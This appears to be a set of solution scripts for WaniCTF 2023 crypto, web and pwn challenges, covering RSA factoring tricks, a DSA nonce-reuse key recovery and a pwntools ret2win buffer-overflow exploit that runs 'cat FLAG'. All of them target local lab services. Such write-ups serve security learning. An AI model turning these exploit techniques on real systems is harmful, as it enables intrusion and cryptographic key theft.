# cry

## EZDORSA_Lv1

- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/cry/EZDORSA_Lv1

```zsh
#!/usr/bin/env python3
p = 3
q = 5
n = p*q
e = 65535
# c ≡ m^e (mod n) ≡ 10 (mod n)
for m in range(1, n):
    c = pow(m, e, n)
    if c == 10:
        break
print(f"FLAG{{{m}}}")

phi = (p-1)*(q-1)
d = pow(e, -1, phi)
m2 = pow(c, d, n)
print(f"FLAG{{{m2}}}")
```

## EZDORSA_Lv2

- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/cry/EZDORSA_Lv2

```python
#!/usr/bin/env python3
from Cryptodome.Util.number import long_to_bytes
from gmpy2 import iroot

n = e = c = 0
exec(open("file/out.txt").read())
print(f"{n=}, {e=}, {c=}")
c //= pow(5, 100, n)
flag = long_to_bytes(iroot(c, e)[0])
print(f"{flag=}")
```

## EZDORSA_Lv3

- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/cry/EZDORSA_Lv3

```python
#!/usr/bin/env sage
exec(open("file/out.txt").read())
primes = [fac[0] for fac in factor(n)]
print(f"{primes=}")
```

```python
#!/usr/bin/env python3
from math import prod

from Crypto.Util.number import long_to_bytes

n = e = c = 0
exec(open("file/out.txt").read())
primes = [
        16969003, 17009203, 17027027, 17045117, 17137009, 17151529,
        17495507, 17685739, 17933647, 18206689, 18230213, 18505933,
        18613019, 18868781, 18901951, 18947729, 19022077, 19148609,
        19574987, 19803209, 20590697, 20690983, 21425317, 21499631,
        21580043, 21622099, 21707797, 21781139, 21792359, 21982481,
        22101437, 22367311, 22374509, 22407799, 22491913, 22537409,
        22542229, 22550677, 22733041, 23033441, 23049673, 23083759,
        23179243, 23342663, 23563571, 23611043, 23869933, 24027973,
        24089029, 24436597, 24454291, 24468209, 24848633, 25564219,
        25888721, 26055889, 26119147, 26839909, 27152267, 27304777,
        27316717, 27491137, 27647687, 27801167, 28082749, 28103563,
        28151399, 28620611, 29035709, 29738689, 29891363, 29979379,
        30007841, 30013391, 30049171, 30162343, 30419063, 30461393,
        30625601, 31004861, 31108043, 31123457, 31269479, 31384663,
        31387957, 31390189, 31469279, 32307589, 32432339, 32514061,
        32628367, 32687509, 32703337, 32709977, 32715343, 32737429,
        32831261, 33388603, 33418129, 33472771]
phi = prod(prime - 1 for prime in primes)
d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m).decode())
```

## pqqp

- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/cry/pqqp

```python
#!/usr/bin/env sage
with open("file/output.txt") as f:
    n = int(f.readline())
    e = int(f.readline())
    c = int(f.readline())
    s = int(f.readline())
x = PolynomialRing(QQ, 'x').gen()
f = x^2 - s*x + n
roots = f.roots()
p = roots[0][0]
q = roots[1][0]
print(f"{p = }")
print(f"{q = }")
```

```python
#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes

with open("file/output.txt") as f:
    n = int(f.readline())
    e = int(f.readline())
    c = int(f.readline())
    s = int(f.readline())

p = 176330063921012922700637991462863541103998854114502331637244568587102359549595630463000846482379642953757505012490743127493606379742898143117619312114492521189590382203087267098186155670651109512140181571865807227830860711167013696000707228430366770561270525802688909225479987434756271082423940874678428380699
q = 176327691686650177337984785396165958425418762904937364650285527113808599587807083096381029342960394300966162359226409359465329273568982843053136832536771445246955230479323425838863005081078400440102768529159941473729515115826868898933717551687460781540377358906498802364948817391298332874416942797525620440227

phi = (p-1)*(q-1)
d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m).decode())
```

## fusion

- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/cry/fusion

### Solutoin 1

```python
#!/usr/bin/env python3
import sys

from Crypto.Util.number import long_to_bytes
from z3 import BitVec, Solver, sat

n = e = c = r = 0
exec(open("file/output.txt").read())
bits = 1024
P = BitVec('P', bits)
Q = BitVec('Q', bits)
s = Solver()
s.add(P * Q == n)
mask1 = int("55" * 128, 16)
mask2 = mask1 << 1
s.add(r == (P & mask1) + (Q & mask2))
if s.check() == sat:
    m = s.model()
    p = m[P].as_long()
    q = m[Q].as_long()
else:
    sys.exit(1)
phi = (p-1)*(q-1)
d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m).decode())
```

### Solution 2

```python
#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes

n = e = c = r = 0
exec(open("file/output.txt").read())
mask = int("55" * 128, 16)
p = r & mask
mask = mask << 1
q = r & mask
for i in range(128*8):
    mask = 1 << i
    if i % 2 == 0:
        if (n & mask) != (p*q & mask):
            q ^= mask
    else:
        if (n & mask) != (p*q & mask):
            p ^= mask
assert n == p*q
phi = (p-1)*(q-1)
d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m).decode())
```

## dsa

- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/cry/dsa

```python
#!/usr/bin/env python3
from math import gcd

from Crypto.Util.number import long_to_bytes
from pwn import log, remote


def read_num(io, base: int) -> int:
    io.recvuntil(b" = ")
    return int(io.recvline(drop=True), base)


# p = 2791...
# q = 1395...
# g = 2
# y = 9844...
# FLAG = *****************************
# sha256(FLAG) = 7aad....
# r = 6140....
# s = 4416....
def get_params():
    io = remote("::1", 50010)
    p = read_num(io, 10)
    q = read_num(io, 10)
    g = read_num(io, 10)
    y = read_num(io, 10)
    io.readline()  # FLAG
    sha256flag = read_num(io, 16)
    r = read_num(io, 10)
    s = read_num(io, 10)
    io.stream()
    io.close()
    return p, q, g, y, sha256flag, r, s


while True:
    params = []
    for i in range(4):
        params.append(get_params())

    xk = []
    for i in range(0, 4, 2):
        p1, q1, g1, y1, sha256flag1, r1, s1 = params[i]
        p2, q2, g2, y2, sha256flag2, r2, s2 = params[i+1]
        assert r1 == r2
        assert q1 == q2
        diff_s = (s1-s2) % q1
        xk.append((diff_s * pow(r1, -1, q1)) % q1)

    flag = long_to_bytes(gcd(*xk))
    if b"FLAG{" in flag:
        log.success("%s", flag.decode())
        break
```

# web

## indexeddb

- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/indexeddb

```zsh
curl -s http://localhost/ | grep -o 'FLAG{.*}'
```

# pwn

## ret2win

- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/pwn/ret2win

```python
#!/usr/bin/env python3
from pwn import ELF, args, context, flat, process, remote
from pwnlib import gdb

exe = context.binary = ELF("file/chall", checksec=False)
if args.GDB:
    io = gdb.debug(exe.path, gdbscript="b main\nc")
elif args.REMOTE:
    io = remote("::1", 9003)
else:
    io = process(exe.path)
io.sendlineafter(b" > ", flat(
    b"A"*0x28,
    exe.sym.win))
io.sendline(b"cat FLAG")
io.stream()
```
